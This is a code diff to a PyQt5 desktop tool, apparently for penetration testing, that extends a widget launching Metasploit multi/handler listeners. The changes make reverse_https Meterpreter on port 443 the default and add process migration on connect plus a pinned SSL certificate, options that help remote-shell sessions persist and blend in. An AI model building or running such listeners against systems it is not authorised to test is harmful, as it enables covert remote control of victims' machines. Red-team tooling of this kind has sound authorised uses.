@@ -7,7 +7,7 @@ from PyQt5.QtWidgets import (
     QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, 
     QLineEdit, QComboBox, QTextEdit, QGroupBox, QSplitter, 
     QTabWidget, QFormLayout, QMessageBox, QDialog, QTableWidget, 
-    QTableWidgetItem, QHeaderView, QFrame, QFileDialog
+    QTableWidgetItem, QHeaderView, QFrame, QFileDialog, QCheckBox
 )
 from PyQt5.QtCore import Qt, QThread, pyqtSignal
 from PyQt5.QtNetwork import QNetworkInterface, QAbstractSocket
@@ -140,7 +140,7 @@ class NetcatListenerWidget(QWidget):
             self.term_in.clear()
 
 # ---------------------------------------------------------
-# 3. NEW: MSFCONSOLE LISTENER WIDGET
+# 3. NEW: MSFCONSOLE LISTENER WIDGET (UPDATED)
 # ---------------------------------------------------------
 class MsfListenerWidget(QWidget):
     """A widget to launch msfconsole listeners quickly."""
@@ -157,12 +157,17 @@ class MsfListenerWidget(QWidget):
         # Configuration Group
         config_group = QGroupBox("Metasploit Handler Options")
         config_group.setStyleSheet("QGroupBox { font-weight: bold; color: #d63384; border: 1px solid #4a4a5e; margin-top: 5px; }")
-        config_layout = QHBoxLayout(config_group)
+        
+        # Using a Grid Layout for better organization of new fields
+        from PyQt5.QtWidgets import QGridLayout
+        config_layout = QGridLayout(config_group)
+        config_layout.setSpacing(10)
 
-        # Payload Selection
+        # 1. Payload Selection
         self.combo_payload = QComboBox()
         self.combo_payload.setEditable(True)
         common_payloads = [
+            "windows/x64/meterpreter/reverse_https", # Default for your request
             "windows/x64/meterpreter/reverse_tcp",
             "linux/x64/meterpreter/reverse_tcp",
             "java/jsp_shell_reverse_tcp",
@@ -171,31 +176,58 @@ class MsfListenerWidget(QWidget):
             "cmd/unix/reverse_netcat"
         ]
         self.combo_payload.addItems(common_payloads)
-        self.combo_payload.setFixedWidth(250)
-
-        # LHOST
+        
+        # 2. LHOST / LPORT
         self.inp_lhost = QComboBox() 
         self.inp_lhost.setEditable(True)
         self.refresh_ips()
-        self.inp_lhost.setFixedWidth(150)
+        
+        self.inp_lport = QLineEdit("443") # Default to 443 for https
+        
+        # 3. Advanced Options (Migrate & Cert)
+        self.chk_migrate = QCheckBox("PrependMigrate")
+        self.chk_migrate.setChecked(True) # True by default as requested
+        self.chk_migrate.setToolTip("Sets PrependMigrate=true to migrate immediately upon connection.")
+        
+        self.chk_ssl = QCheckBox("Use SSL Cert:")
+        self.chk_ssl.setChecked(True)
+        self.chk_ssl.toggled.connect(lambda c: self.inp_ssl_cert.setEnabled(c))
+        
+        # Default cert path relative to project
+        default_cert = os.path.join("payloads", "justice.pem")
+        self.inp_ssl_cert = QLineEdit(default_cert)
+        self.btn_browse_cert = QPushButton("...")
+        self.btn_browse_cert.setFixedWidth(30)
+        self.btn_browse_cert.clicked.connect(self.browse_cert)
 
-        # LPORT
-        self.inp_lport = QLineEdit("4444")
-        self.inp_lport.setFixedWidth(60)
-
-        # Start Button
+        # 4. Start Button
         self.btn_start = QPushButton("Launch MSF")
-        self.btn_start.setStyleSheet("background-color: #6610f2; color: white; font-weight: bold;")
+        self.btn_start.setStyleSheet("background-color: #6610f2; color: white; font-weight: bold; padding: 5px;")
         self.btn_start.clicked.connect(self.toggle_msf)
 
-        config_layout.addWidget(QLabel("Payload:"))
-        config_layout.addWidget(self.combo_payload)
-        config_layout.addWidget(QLabel("LHOST:"))
-        config_layout.addWidget(self.inp_lhost)
-        config_layout.addWidget(QLabel("LPORT:"))
-        config_layout.addWidget(self.inp_lport)
-        config_layout.addWidget(self.btn_start)
-        config_layout.addStretch()
+        # --- Layout Placement ---
+        # Row 0: Payload & Connection
+        config_layout.addWidget(QLabel("Payload:"), 0, 0)
+        config_layout.addWidget(self.combo_payload, 0, 1, 1, 3) # Span 3 columns
+        
+        config_layout.addWidget(QLabel("LHOST:"), 1, 0)
+        config_layout.addWidget(self.inp_lhost, 1, 1)
+        config_layout.addWidget(QLabel("LPORT:"), 1, 2)
+        config_layout.addWidget(self.inp_lport, 1, 3)
+        
+        # Row 2: Advanced Options
+        config_layout.addWidget(self.chk_migrate, 2, 0, 1, 2)
+        
+        # Row 3: SSL Cert (Nested Layout for checkbox+input+btn)
+        h_ssl = QHBoxLayout()
+        h_ssl.setContentsMargins(0,0,0,0)
+        h_ssl.addWidget(self.chk_ssl)
+        h_ssl.addWidget(self.inp_ssl_cert)
+        h_ssl.addWidget(self.btn_browse_cert)
+        config_layout.addLayout(h_ssl, 3, 0, 1, 4)
+        
+        # Row 4: Button
+        config_layout.addWidget(self.btn_start, 4, 0, 1, 4)
 
         layout.addWidget(config_group)
 
@@ -223,6 +255,14 @@ class MsfListenerWidget(QWidget):
                         self.inp_lhost.addItem(ip)
         self.inp_lhost.addItem("0.0.0.0")
 
+    def browse_cert(self):
+        start_dir = os.path.join(self.working_directory, "payloads")
+        if not os.path.exists(start_dir): start_dir = self.working_directory
+        
+        f, _ = QFileDialog.getOpenFileName(self, "Select Handler Certificate", start_dir, "PEM Files (*.pem);;All Files (*)")
+        if f:
+            self.inp_ssl_cert.setText(f)
+
     def toggle_msf(self):
         if self.worker and self.worker.isRunning():
             self.worker.stop()
@@ -234,19 +274,42 @@ class MsfListenerWidget(QWidget):
             payload = self.combo_payload.currentText()
             lhost = self.inp_lhost.currentText()
             lport = self.inp_lport.text()
-
-            # Construct the one-liner
-            msf_cmd = (
-                f"use exploit/multi/handler; "
-                f"set PAYLOAD {payload}; "
-                f"set LHOST {lhost}; "
-                f"set LPORT {lport}; "
-                f"set ExitOnSession false; "
-                f"run"
-            )
+            
+            # --- Construct MSF Command ---
+            commands = [
+                "use exploit/multi/handler",
+                f"set PAYLOAD {payload}",
+                f"set LHOST {lhost}",
+                f"set LPORT {lport}",
+                "set ExitOnSession false"
+            ]
+            
+            # Add PrependMigrate if checked
+            if self.chk_migrate.isChecked():
+                commands.append("set PrependMigrate true")
+            
+            # Add HandlerSSLCert if checked
+            if self.chk_ssl.isChecked():
+                cert_path = self.inp_ssl_cert.text().strip()
+                # Resolve relative path if needed
+                if not os.path.isabs(cert_path):
+                    cert_path = os.path.join(self.working_directory, cert_path)
+                
+                # Check if file exists (Optional: warn user, but for now just set it)
+                if os.path.exists(cert_path):
+                    commands.append(f"set HandlerSSLCert {cert_path}")
+                    # For reverse_https, we often need StagerVerifySSLCert too if using paranoid mode
+                    commands.append("set StagerVerifySSLCert true") 
+                else:
+                    self.term_out.append(f"[!] Warning: Cert file not found at {cert_path}. Listener might fail for paranoid payloads.")
+            
+            commands.append("run")
+            
+            # Join commands with semicolons
+            msf_cmd_str = "; ".join(commands)
             
             # -q for quiet, -x to execute command
-            full_cmd = f"msfconsole -q -x \"{msf_cmd}\""
+            full_cmd = f"msfconsole -q -x \"{msf_cmd_str}\""
 
             self.term_out.clear()
             self.term_out.append(f"[*] Starting: {full_cmd}\n")
